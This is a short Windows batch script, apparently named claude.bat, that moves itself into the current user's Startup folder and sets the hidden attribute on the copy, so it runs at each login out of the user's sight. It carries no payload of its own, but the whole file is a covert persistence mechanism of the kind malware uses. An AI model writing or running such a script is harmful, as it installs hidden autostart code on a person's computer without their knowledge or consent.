@echo off
set "source=%~dp0claude.bat"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
move "%source%" "%startup%\"
attrib +h "%startup%\claude.bat"
pause
